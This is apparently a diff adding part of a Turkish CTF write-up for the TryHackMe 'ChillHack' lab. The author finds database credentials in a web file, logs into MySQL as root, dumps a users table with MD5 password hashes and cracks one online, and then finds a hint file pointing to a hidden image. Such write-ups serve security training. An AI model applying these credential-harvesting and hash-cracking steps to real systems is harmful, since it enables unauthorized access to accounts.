@@ -172,3 +172,81 @@ cat local.txt
 
 Geri yetki yükseltmek ve root bayrağını almak kaldı.
 
+Makinede biraz gezindikten sonra index.php dosyasının içinde bazı işe yarar bilgiler buluyorum.
+
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/ChillHack/images/a8.png?raw=true)
+
+Bu bilgilerle database'e erişmeye çalışalım.
+
+
+```
+mysql -u root -p'!@m+her00+@db'
+```
+
+```
+apaar@ubuntu:/var/www/files$ mysql -u root -p'!@m+her00+@db'
+mysql: [Warning] Using a password on the command line interface can be insecure.
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 3
+Server version: 5.7.31-0ubuntu0.18.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+No entry for terminal type "unknown";
+using dumb terminal settings.
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
+| webportal          |
++--------------------+
+5 rows in set (0.00 sec)
+mysql> use webportal;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+Database changed
+mysql> show tables;
++---------------------+
+| Tables_in_webportal |
++---------------------+
+| users               |
++---------------------+
+1 row in set (0.00 sec)
+mysql> select * from users;
++----+-----------+----------+-----------+----------------------------------+
+| id | firstname | lastname | username  | password                         |
++----+-----------+----------+-----------+----------------------------------+
+|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de23f111806cc4fd |
+|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df0501e53c789a649 |
++----+-----------+----------+-----------+----------------------------------+
+2 rows in set (0.00 sec)
+```
+
+Anurodh kullanıcısının password hash'ini bulduk.[CrackStation](https://crackstation.net/) sitesine giderek hash'i kıralım.
+
+![](https://github.com/umutsaglam/CTF-Writeups/blob/main/TryHackMe/ChillHack/images/a9.png?raw=true)
+
+Bu bilgilerle bir yere varamadım geri dönüp başka dosyalara göz atmaya karar verdim.
+
+/var/www/files içinde hacker.php dosyası dikkatimi çekti. cat ile açtığımda ipucu buldum.
+
+```
+<center>
+	<img src = "images/hacker-with-laptop_23-2147985341.jpg"><br>
+	<h1 style="background-color:red;">You have reached this far. </h2>
+	<h1 style="background-color:black;">Look in the dark! You will find your answer</h1>
+</center>
+```
+
+Yazılan fotoğrafı indirip baktım:
+
+
+
+
